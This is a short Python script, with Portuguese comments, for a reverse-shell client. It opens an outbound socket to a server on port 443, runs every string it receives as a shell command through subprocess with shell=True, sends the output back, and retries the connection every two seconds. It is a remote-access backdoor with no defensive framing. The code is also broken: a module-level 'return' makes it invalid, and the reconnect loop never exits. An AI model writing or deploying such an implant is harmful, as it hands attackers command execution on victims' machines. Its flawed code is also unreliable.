import socket
import time
import threading
import subprocess

class Client:
    def __init__(self, server_ip):
        self.server_ip = server_ip
        self.server_port = 443
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        try:
            self.socket.connect((self.server_ip, self.server_port))
            threading.Thread(target=self.receive_message).start()
            return 
        except ConnectionRefusedError:
            return 

    def receive_message(self):
        while True:
            try:
                data = self.socket.recv(1024).decode().strip()
                if data:
                    if data == "/sair":
                        return
                    else:
                        threading.Thread(target=self.execute_command, args=(data,)).start()
                else:
                    return
            except Exception as error:
                return

    def execute_command(self, data):
        try:
            proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = proc.stdout.read()
            self.socket.send(output)
        except subprocess.CalledProcessError as e:
            error_output = e.output
            self.socket.send(error_output)
        except Exception as e:
            pass

    def send_message(self, message):
        try:
            self.socket.sendall(message.encode())
        except:
            pass

    def close(self):
        self.socket.close()

if __name__ == "__main__":
    ip = "127.0.0.1"  # IP do servidor
    while True:
        client = Client(ip)
        if client.connect():
            return
        else:
            time.sleep(2)  
